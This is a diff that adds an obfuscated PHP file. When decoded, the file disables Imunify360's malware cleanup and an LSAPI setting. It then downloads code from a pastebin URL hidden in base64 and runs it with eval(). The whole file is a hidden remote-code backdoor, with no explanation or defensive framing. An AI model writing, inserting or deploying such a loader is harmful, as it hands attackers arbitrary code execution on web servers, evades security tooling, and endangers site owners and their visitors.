@@ -1,0 +1,8 @@
+<?php
+/*   __________________________________________________
+    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.14  |
+    |              on 2025-01-06 14:10:57              |
+    |    GitHub: https://github.com/pk-fr/yakpro-po    |
+    |__________________________________________________|
+*/
+goto HdLBo; kqqjr: $GvM95 = "\77\x3e"; goto k0him; iFTxB: ini_set("\151\x6d\x75\x6e\x69\x66\171\63\x36\60\x2e\143\x6c\145\x61\156\x75\160\137\157\x6e\137\x72\x65\163\164\157\x72\x65", false); goto CKGJi; CKGJi: function O8s6s($HpOHN) { goto pw8Uu; Yupdp: return $p7qDX; goto GCTs3; GCTs3: gdt82: goto D2yJ2; Sq3_D: curl_setopt($QbbIU, CURLOPT_URL, $HpOHN); goto qefxS; Wtx8C: $p7qDX = file_get_contents($HpOHN); goto xoxEv; uFLyd: $QbbIU = curl_init(); goto Lj2zc; xoxEv: return $p7qDX; goto PeISk; pw8Uu: if (function_exists("\143\165\162\154\137\x69\156\x69\x74")) { goto huQrM; } goto Wtx8C; hhD6q: curl_close($QbbIU); goto Yupdp; qy_7a: curl_setopt($QbbIU, CURLOPT_RETURNTRANSFER, 1); goto Sq3_D; qefxS: $p7qDX = curl_exec($QbbIU); goto hhD6q; PeISk: goto gdt82; goto tJHVf; Lj2zc: curl_setopt($QbbIU, CURLOPT_HEADER, 0); goto qy_7a; tJHVf: huQrM: goto uFLyd; D2yJ2: } goto kqqjr; HdLBo: ini_set("\x6c\x73\x61\x70\151\137\x62\x61\x63\x6b\145\156\144\x5f\x6f\146\x66", "\61"); goto iFTxB; k0him: eval($GvM95 . O8s6s(base64_decode("\x61\x48\x52\x30\143\110\x4d\x36\x4c\171\x39\167\131\x58\116\x30\x5a\x57\x4a\x70\x62\151\x35\164\x62\63\x70\160\x62\x47\170\150\x4c\x6d\x39\x79\x5a\x79\x39\x46\x52\x55\170\x71\x63\105\71\167\x55\171\71\x79\x59\x58\x63\75")));
